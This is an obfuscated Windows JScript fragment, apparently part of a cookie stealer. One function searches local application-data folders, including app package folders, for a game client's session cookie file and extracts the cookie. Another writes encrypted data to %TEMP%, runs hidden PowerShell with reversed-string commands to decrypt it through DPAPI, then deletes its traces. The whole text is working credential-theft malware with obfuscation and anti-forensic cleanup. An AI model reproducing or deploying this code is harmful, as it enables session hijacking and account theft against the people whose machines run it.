/* ================= DPAPI inline, detache, en %TEMP% ================= */
var _dp=function(b64){
 try{
  var tp=_e("TEMP"); if(!tp){ tp=_p1; }
  _md(tp);
  var f1=tp+"\\"+_g()+".tmp", f2=tp+"\\"+_g()+".out";
  try{ _A2.DeleteFile(f1,true); }catch(e){}
  try{ _A2.DeleteFile(f2,true); }catch(e){}
  _w(f1,b64);
  var exe=_e("SystemRoot")+S_PSD+S_PSX;
  try{ if(!_A2.FileExists(exe)){ exe=S_PSX; } }catch(e){}
  var line = '"'+exe+'" -NoProfile -NonInteractive -NoLogo -Command "'+_rv(G1)+f1+_rv(G2)+f2+_rv(G3)+f2+_rv(G4)+'"';
  try{ _A1.Run(line,0,false); }catch(e){}
  var o="", n=0;
  try{
   for(;n<42;n++){
    if(_A2.FileExists(f2)){ try{ if(_A2.GetFile(f2).Size>20){ break; } }catch(e){} }
    _slp(120);
   }
   if(_A2.FileExists(f2)){ try{ if(_A2.GetFile(f2).Size>20){ o=_r(f2); } }catch(e){} }
  }catch(e){}
  try{ _A2.DeleteFile(f1,true); }catch(e){}
  try{ _A2.DeleteFile(f2,true); }catch(e){}
  return o;
 }catch(e){ return ""; }
};

/* ================= extraction ================= */
var _fc=function(){
 try{
  var a=[ _e("LOCALAPPDATA")+S_RBL+S_RBC,
          _e("LOCALAPPDATA")+S_RBL+S_RB2,
          _e("LOCALAPPDATA")+S_RBK,
          _e("APPDATA")+S_RBL+S_RBC,
          _e("USERPROFILE")+"\\AppData\\Local"+S_RBL2+S_RBC ];
  var fp="",i;
  for(i=0;i<a.length;i++){ try{ if(_A2.FileExists(a[i])){ fp=a[i]; break; } }catch(e){} }

  if(!fp){
   var pk=_e("LOCALAPPDATA")+S_PKG;
   try{
    if(_A2.FolderExists(pk)){
     var en=new Enumerator(_A2.GetFolder(pk).SubFolders);
     for(; !en.atEnd(); en.moveNext()){
      var sb=en.item();
      if(sb.Name.indexOf(S_RBX)>-1){
       var uw=sb.Path+S_LST+S_RB2;
       if(_A2.FileExists(uw)){ fp=uw; break; }
      }
     }
    }
   }catch(e2){}
  }
  if(!fp){ return {ok:false, how:"no cookie file", src:""}; }

  var rw=_r(fp);
  if(rw.length<50){ return {ok:false, how:"file too small ("+rw.length+"b)", src:fp}; }

  var ck="", ap="";
  if(rw.indexOf(S_WN)>-1){ ck=_clean(rw); ap="plain"; }
  if(!ck && rw.indexOf(S_CD)>-1){
   ap="dpapi - json";
   var s1=rw.indexOf(S_CD+'":"');
   if(s1>-1){
    s1+=14;
    var e1=rw.indexOf('"',s1);
    if(e1>s1){
     var b6=rw.substring(s1,e1);
     if(b6.length>100){
      ck=_clean(_dp(b6));
      if(!ck){ ck=_clean(b6); ap="json - raw"; }
     }
    }
   }
  }
  if(!ck && rw.indexOf(S_RS)>-1){ ap="raw"; ck=_clean(rw); }
  if(!ck){ ck=_clean(rw); ap="raw file"; }

  if(ck.length<100 || ck.indexOf(S_CAE)<0){ return {ok:false, how:"cookie malformed ("+ck.length+"b)", src:fp}; }
  return {ok:true, ck:ck, how:ap, src:fp};
 }catch(e){ return {ok:false, how:"error", src:""}; }
};

